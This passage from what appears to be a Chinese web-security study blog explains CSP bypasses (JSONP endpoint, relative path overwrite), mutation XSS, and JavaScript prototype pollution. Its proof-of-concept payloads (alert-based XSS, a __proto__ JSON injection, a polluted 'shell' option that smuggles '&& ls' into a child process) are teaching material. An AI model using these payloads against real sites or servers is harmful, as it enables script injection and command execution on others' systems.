<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.google.com<span class="hljs-regexp">/complete/</span>search?client=chrome&amp;q=<span class="hljs-number">123</span>&amp;jsonp=alert(<span class="hljs-number">1</span>)<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure>

<p>因为<a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a> 所以会执行  </p>
<h4 id="通过-RPO（相对路径覆盖）绕过"><a href="#通过-RPO（相对路径覆盖）绕过" class="headerlink" title="通过 RPO（相对路径覆盖）绕过"></a>通过 RPO（相对路径覆盖）绕过</h4><p>如果 CSP 允许路径 <code>https://example.com/scripts/react/</code> ，那么在某些服务器上可以通过如下方式绕过：  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://example.com/scripts/react/..%2fangular%2fangular.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>让其加载<code>https://example.com/scripts/angular/angular.js</code></p>
<p>有些服务器会认为你是在加载<code>https://example.com/scripts/react/</code>下面的一个叫<code>..%2fangular%2fangular.js</code>的文件  </p>
<p>但是有些服务器会解析为..&#x2F;angular&#x2F;angular.js  </p>
<p>从而加载<code>https://example.com/scripts/angular/angular.js</code></p>
<h4 id="csp本身限制"><a href="#csp本身限制" class="headerlink" title="csp本身限制"></a>csp本身限制</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;none&#x27;; script-src &#x27;unsafe-inline&#x27;;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// any JavaScript code</span></span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>有个csp是这样 但是运行执行js代码 如何获取cookie并且带出去(获取很简单)  </p>
<p><a target="_blank" rel="noopener" href="https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/#other-bypass-techniques">https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/#other-bypass-techniques</a>  </p>
<h3 id="MXSS"><a href="#MXSS" class="headerlink" title="MXSS"></a>MXSS</h3><p>这种“HTML 字符串在渲染过程中被浏览器更改”的行为称为突变。而利用这种行为实现的XSS自然就称为变异XSS  </p>
<p>例如  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml">*&lt;!**DOCTYPE* *html**&gt;*<br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">content</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    content.innerHTML = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>&#x27;</span></span><br><span class="language-xml"><span class="language-handlebars">  </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>将<code>&lt;h1&gt;</code>放入<code>&lt;table&gt;</code>中 似乎没问题 但是当年打开实际的html网页去查看源代码 会发现变成了  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>自动”跳出”  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">content</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    content.innerHTML = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>&#x27;</span></span><br><span class="language-xml"><span class="language-handlebars">  </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>还有这个 打开后会发现  </p>
<p>P标签自动跳出 并且自动补充  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412131242978.png" srcset="/img/loading.gif" lazyload alt="1734064914275"></p>
<p>浏览器认为<code>&lt;p&gt;</code>不应该位于<code>&lt;svg&gt;</code>内，因此它将<code>&lt;p&gt;</code>从<code>&lt;svg&gt;</code>中移出，并通过添加<code>&lt;/p&gt;</code>来修复 HTML  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">content</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    content.innerHTML = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>&#x27;</span></span><br><span class="language-xml"><span class="language-handlebars">  </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>再看这个  </p>
<p>结果会是  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>浏览器通过在前面添加<code>&lt;p&gt;</code>来自动修复<code>&lt;/p&gt;</code> ，但该标记仍然位于<code>&lt;svg&gt;</code>内。  </p>
<p>如果我们将<code>&lt;svg&gt;&lt;p&gt;&lt;/p&gt;hello&lt;/svg&gt;</code>传递给<code>innerHTML</code>  </p>
<p>会输出  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;svg&gt;</span><span class="hljs-section">&lt;/svg&gt;</span><br><span class="hljs-section">&lt;p&gt;</span><span class="hljs-section">&lt;/p&gt;</span><br><span class="hljs-attribute">hello</span><br></code></pre></td></tr></table></figure>

<p>不仅是<code>&lt;p&gt;</code> ，甚至下面的“hello”也会跳出来。原来位于<code>&lt;svg&gt;</code>内部的所有内容现在都位于其外部。  </p>
<p><strong><style>标签</strong>  </p>
<p>该标签内的所有内容都被解释为文本  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>&lt;a id=&quot;test&quot;&gt;&lt;/a&gt;</code> 这段为纯文本  </p>
<p>如果我们添加外部<code>&lt;svg&gt;</code> ，浏览器解释它的方式将会不同，一切都会改变……  </p>
<p><a target="_blank" rel="noopener" href="https://aszx87410.github.io/beyond-xss/en/ch2/mutation-xss/">https://aszx87410.github.io/beyond-xss/en/ch2/mutation-xss/</a>  </p>
<h3 id="通用xss"><a href="#通用xss" class="headerlink" title="通用xss"></a>通用xss</h3><p>此类 XSS 攻击的目标不是网站本身，而是浏览器或内置插件。  </p>
<p><a target="_blank" rel="noopener" href="https://aszx87410.github.io/beyond-xss/en/ch2/universal-xss/">https://aszx87410.github.io/beyond-xss/en/ch2/universal-xss/</a>  </p>
<h2 id="不需要js代码的前端攻击方式"><a href="#不需要js代码的前端攻击方式" class="headerlink" title="不需要js代码的前端攻击方式"></a>不需要js代码的前端攻击方式</h2><p>在此之前 觉得前端的攻击方式只有xss  </p>
<p>总觉得一定要能够直接执行代码才能达成攻击  </p>
<h4 id="利用原型链来攻击"><a href="#利用原型链来攻击" class="headerlink" title="利用原型链来攻击"></a>利用原型链来攻击</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-keyword">var</span> str2 = <span class="hljs-string">&quot;b&quot;</span><br>console.<span class="hljs-built_in">log</span>(str.<span class="hljs-keyword">repeat</span> === str2.<span class="hljs-keyword">repeat</span>) <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure>

<p>先看这个 repeat方法是哪来的  </p>
<p>str和str2 只是 由string 这个类实例化出来的对象  </p>
<p>实际上访问  <code>str.repeat</code> 或 <code>str2.repeat</code>，实际上是访问同一个方法 <code>String.prototype.repeat</code>。</p>
<p>所以最后会给出true的结果   </p>
<p><strong>scope</strong>  </p>
<p><strong>scope（作用域）</strong> 是变量、函数和对象的可访问性范围，决定了哪些部分的代码可以访问或修改它们  </p>
<p><strong><strong>proto</strong></strong>  </p>
<p>在JavaScript 中有一个隐藏的属性，叫做<code>__proto__</code>，它储存的值就是JavaScript 引擎应该往上找的地方  </p>
<p>也就是说 在当前的对象里面找不到某个方法的话 会往上找 去找他的原型对象也就是 (<strong>prototype</strong>) 而往上找的地方就是由这个属性来决定  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(str.__proto__) <span class="hljs-comment">// String.prototype</span><br></code></pre></td></tr></table></figure>

<p>如果原型对象也没有，它会继续查找上一级原型，直到 <code>null</code>（即 <code>Object.prototype</code>）。</p>
<p><strong>prototype</strong>  </p>
<p>在 JavaScript 中，<strong>prototype（原型）</strong> 是对象用来共享属性和方法的一种机制。每个对象都有一个内部链接到另一个对象（称为原型）。当访问对象的属性或方法时，如果对象本身没有定义，它会沿着原型链查找，直到找到为止。  </p>
<p><code>prototype</code> 是一个属性，存在于<strong>构造函数</strong>（如 <code>String</code>、<code>Array</code>）上 它定义了通过该构造函数创建的所有对象共享的属性和方法  </p>
<p>例如 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">//包含字符串string的方法</span><br></code></pre></td></tr></table></figure>



<p>所以说 上面的repeat方法 其实全名是 String.prototype.repeat  </p>
<p>这就是javascript原型链的原理和运行方式  </p>
<h4 id="javascript原型链污染"><a href="#javascript原型链污染" class="headerlink" title="javascript原型链污染"></a>javascript原型链污染</h4><p>因为 prototype 这玩意是能被修改的  </p>
<p>也就是说能在里面自己添加方法 或者 属性  </p>
<p>也就会造成污染  </p>
<p>例如 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">a</span> = <span class="hljs-number">123</span><br><span class="hljs-keyword">var</span> obj = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>) <span class="hljs-comment">// 123</span><br></code></pre></td></tr></table></figure>

<p>这段代码在Object.prototype 里面创建了一个a的方法  </p>
<p>调用a方法会回显123  </p>
<p>看个原型链污染的例子  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Object<span class="hljs-selector-class">.prototype</span><span class="hljs-selector-class">.innerHTML</span> = <span class="hljs-string">&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;</span><br><br><span class="hljs-comment">// 底下都跟剛剛一樣</span><br><span class="hljs-selector-tag">var</span> qs = new <span class="hljs-built_in">URLSearchParams</span>(location<span class="hljs-selector-class">.search</span><span class="hljs-selector-class">.slice</span>(<span class="hljs-number">1</span>))<br><br>document<span class="hljs-selector-class">.body</span><span class="hljs-selector-class">.appendChild</span>(<span class="hljs-built_in">createElement</span>(&#123;<br>  tag: <span class="hljs-string">&#x27;h2&#x27;</span>,<br>  innerText: `Search result <span class="hljs-keyword">for</span> $&#123;qs<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;q&#x27;</span>)&#125;`<br>&#125;))<br><br>function <span class="hljs-built_in">createElement</span>(config)&#123;<br>  const element = document<span class="hljs-selector-class">.createElement</span>(config.tag)<br>  <span class="hljs-comment">// 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true</span><br>  <span class="hljs-keyword">if</span> (config.innerHTML) &#123;<br>    element<span class="hljs-selector-class">.innerHTML</span> = config<span class="hljs-selector-class">.innerHTML</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    element<span class="hljs-selector-class">.innerText</span> = config<span class="hljs-selector-class">.innerText</span><br>  &#125;<br>  return element<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这段代码为了防止xss 特意使用了innertext  </p>
<p>但是在最前面有  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">Object.prototype.innerHTML = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure>

<p>将 <code>innerHTML</code> 属性添加到 <code>Object.prototype</code> 上，并将其值设置为 <code>&#39;&lt;img src=x onerror=alert(1)&gt;&#39;</code>。这意味着 <strong>所有对象</strong>（包括 <code>config</code> 对象）都会继承这个 <code>innerHTML</code> 属性，且其值为这个恶意的字符串。</p>
<p>所以说 config这个对象 就可能变成了  </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">const config</span> = &#123;<br>  tag: <span class="hljs-string">&#x27;h2&#x27;</span>,<br>  innerText: <span class="hljs-string">&#x27;Search result for apple&#x27;</span><br>  innerhtml: <span class="hljs-string">&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>因为config对象里面包含了innerhtml 所以if条件判断为true  </p>
<p>执行payload 弹出弹窗  </p>
<p><strong>所以说什么样的代码能够让我们去修改原型链上的属性呢</strong>  </p>
<p>发生此类问题的常见情况有两种。第一个是<strong>解析查询字符串。</strong>    </p>
<p>例如  </p>
<p>许多查询字符串库都支持数组，例如<code>?a=1&amp;a=2</code>或<code>?a[]=1&amp;a[]=2</code> ，可以将其解析为数组。  </p>
<p>甚至有些库支持 对象  </p>
<p>如下所示： <code>?a[b][c]=1</code> ，这会生成一个对象<code>&#123;a: &#123;b: &#123;c: 1&#125;&#125;&#125;</code>   </p>
<p>如果输入查询参数为 <code>__proto__[a]=3</code>  </p>
<p>就会造成原型链污染  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> qs = parseQs(<span class="hljs-string">&quot;__proto__[a]=3&quot;</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(qs); <span class="hljs-comment">// &#123;&#125;</span><br><br><span class="hljs-keyword">var</span> obj = &#123;&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(obj.a); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure>



<p>除了解析查询字符串之外，发生此问题的另一个常见场景是<strong>对象合并</strong>。  </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs stata">function <span class="hljs-keyword">merge</span>(a, b) &#123;<br>  <span class="hljs-keyword">for</span> (let <span class="hljs-keyword">prop</span> <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> a[<span class="hljs-keyword">prop</span>] === <span class="hljs-string">&quot;object&quot;</span>) &#123;<br>      <span class="hljs-keyword">merge</span>(a[<span class="hljs-keyword">prop</span>], b[<span class="hljs-keyword">prop</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[<span class="hljs-keyword">prop</span>] = b[<span class="hljs-keyword">prop</span>];<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> config = &#123;<br>  a: 1,<br>  b: &#123;<br>    c: 2,<br>  &#125;,<br>&#125;;<br><br><span class="hljs-keyword">var</span> customConfig = &#123;<br>  b: &#123;<br>    <span class="hljs-keyword">d</span>: 3,<br>  &#125;,<br>&#125;;<br><br><span class="hljs-keyword">merge</span>(config, customConfig);<br>console.<span class="hljs-built_in">log</span>(config);<br><span class="hljs-comment">// &#123; a: 1, b: &#123; c: 2, d: 3 &#125; &#125;</span><br></code></pre></td></tr></table></figure>

<p>假设customconfig可控  </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> customConfig = JSON.<span class="hljs-keyword">parse</span>(&#x27;&#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: 1&#125;&#125;&#x27;);<br><span class="hljs-keyword">merge</span>(config, customConfig);<br></code></pre></td></tr></table></figure>

<p>可以使用这个往里面写入payload  </p>
<p>能达到添加a属性 并且初始化值为1的效果  </p>
<p>再看  </p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Object.prototype.innerText = <span class="hljs-string">&quot;&lt;svg onload=alert(1)&gt;&lt;/svg&gt;&quot;</span>; <span class="hljs-comment">// 原型污染</span><br><br><span class="hljs-type">const</span> config = &#123;&#125;; <span class="hljs-comment">// 创建一个空对象</span><br><span class="hljs-keyword">if</span> (config.innerText) &#123; <br>  console.<span class="hljs-built_in">log</span>(config.innerText); <span class="hljs-comment">// 输出：&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>可能会问这个地方的输出 为什么不会输出转义之后的html代码  </p>
<p>例如像这个一样  </p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">const</span> <span class="hljs-keyword">div</span> = document.createElement(<span class="hljs-string">&quot;div&quot;</span>);<br><span class="hljs-keyword">div</span>.innerText = <span class="hljs-string">&quot;&lt;svg onload=alert(1)&gt;&quot;</span>;<br>console.log(<span class="hljs-keyword">div</span>.innerHTML); <br><span class="hljs-comment">// 输出：&amp;lt;svg onload=alert(1)&amp;gt;</span><br></code></pre></td></tr></table></figure>

<p>因为 <code>config.innerText</code> 在这里并不是一个 DOM 元素的属性，而是直接从 <code>Object.prototype.innerText</code> 获取的值。浏览器的 HTML 转义机制仅在 DOM 操作（如通过 <code>innerText</code> 或 <code>textContent</code> 设置 DOM 元素的内容）时才会生效，而直接访问一个对象的普通属性时，不会发生转义。  </p>
<p><strong>当程序尝试访问某个对象的 <code>innerText</code> 属性时，且该对象本身没有定义这个属性，它会从原型链中查找</strong>  </p>
<p>再看这个  </p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">const</span> child_process = require(<span class="hljs-string">&quot;child_process&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">params</span> = [<span class="hljs-string">&quot;123&quot;</span>];<br><span class="hljs-keyword">const</span> result = child_process.spawnSync(<span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-keyword">params</span>);<br>console.log(result.stdout.toString()); <span class="hljs-comment">// 123</span><br></code></pre></td></tr></table></figure>

<p>启用一个子进程 调用 echo 函数 传入 参数 123  </p>
<p>如果能进行参数污染的话  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> child_process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>);<br><span class="hljs-keyword">const</span> params = [<span class="hljs-string">&quot;123 &amp;&amp; ls&quot;</span>];<br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">shell</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// I only add this line</span><br><span class="hljs-keyword">const</span> result = child_process.<span class="hljs-title function_">spawnSync</span>(<span class="hljs-string">&quot;echo&quot;</span>, params, &#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">1000</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">toString</span>());<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">123</span><br><span class="hljs-comment">index.js</span><br><span class="hljs-comment">node_modules</span><br><span class="hljs-comment">package-lock.json</span><br><span class="hljs-comment">package.json</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<p>将Object.prototype.shell 的值改成ture 那么可以进行任意命令执行  </p>
<p>还有很多例子 有一个项目  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution?tab=readme-ov-file">https://github.com/BlackFan/client-side-prototype-pollution?tab=readme-ov-file</a></p>
<hr>
<p>事实上，不仅现有代码和第三方库，甚至浏览器中的一些 Web API 也会受到原型污染的影响。  </p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">fetch(<span class="hljs-string">&quot;https://example.com&quot;</span>, <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">  mode:</span> <span class="hljs-string">&quot;cors&quot;</span>,<br><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure>

<p>例如这个  </p>
<p>如果存在原型链污染 可以把get方法改成post方法  </p>
